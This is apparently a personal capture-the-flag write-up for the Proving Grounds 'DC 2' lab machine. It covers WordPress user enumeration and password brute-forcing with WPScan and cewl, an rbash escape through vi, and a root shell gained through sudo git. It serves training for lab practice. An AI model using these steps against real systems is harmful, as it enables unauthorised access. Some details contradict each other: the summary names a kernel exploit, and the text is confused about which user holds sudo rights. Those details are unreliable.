---
title: "PG Play: DC 2"
created: "2023-09-06"
updated: "2026-04-11"
type: ctf-writeup
platform: Proving Grounds Play
machine: "DC 2"
os: Linux
status: rooted
tags:
  - - proving-grounds
  - pg-play
  - linux
  - ctf
  - oscp
  - gtfobins-exploit
  - wordpress-enumeration-wpscan
  - wordpress
related:
  - "[[GTFObins-SUID-Quick-Reference]]"
  - "[[Web-Directory-Enumeration]]"
  - "[[Linux-PrivEsc-Decision-Tree]]"
  - "[[Nmap-Enumeration-Methodology]]"
---

# PG Play: DC 2

> **Platform:** Proving Grounds Play | **OS:** Linux | **Date:** 2023-09-06

---

## Quick Summary

**Open Ports:**
- 80/tcp (http)
- 7744/tcp (ssh)

**Key Techniques:**
- GTFObins Exploit
- WordPress Enumeration (WPScan)
- WordPress

**Privilege Escalation Path:**
- Kernel exploit

---

## Full Walkthrough

Proving grounds Play - DC-2 CTF writeup.

## Nmap

```sh
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Did not follow redirect to http://dc-2/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 52517b6e70a4337ad24be10b5a0f9ed7 (DSA)
|   2048 5911d8af38518f41a744b32803809942 (RSA)
|   256 df181d7426cec14f6f2fc12654315191 (ECDSA)
|_  256 d9385f997c0d647e1d46f6e97cc63717 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

make entry in the `/etc/hosts` file as `dc-2` for the attacking machine IP.

## Web PORT: 80


**Techstack**
- Wordpress

### WPscan

```
wpscan --url $URL --disable-tls-checks --enumerate p --enumerate t --enumerate u
```

**Usernames Enumerated**

```text
admin
jerry
tom
```

### Hint

As shown in the webpage the wordslist has to be created using the tool named `cewl`

```sh
cewl http://dc-2/ > password
```
## Bruteforce credentials usgin WPscan

```sh
wpscan --url http://dc-2/ -U users -P password
```

**Credentials Obtained**


SSH to the machine using the credentials. The user `jerry` doesn't have SSH login permission, so login to user `tom`.

### Escaping rbash

```sh
vi
:set shell=/bin/bash
:shell
```

Type the above commmands to escape from the rbash to standard unix shell.

User `tom` may not run anything as sudo on machine DC-2. So switch to user `jerry`.


User tom can run `/usr/bin/git` as sudo.

Search for exploit on GTFO Bins. As per the page the binary can be used to elevate sudo permissions using below commands.


```sh
sudo git -p help config

# Once the git manual page appears type the below and hit enter
!/bin/bash
```

**Root Shell Obtained**

---

## Technique Links

- [[GTFObins-SUID-Quick-Reference]]
- [[Web-Directory-Enumeration]]
- [[Linux-PrivEsc-Decision-Tree]]
- [[Nmap-Enumeration-Methodology]]
- [[Proving-Grounds-Master-Index]]
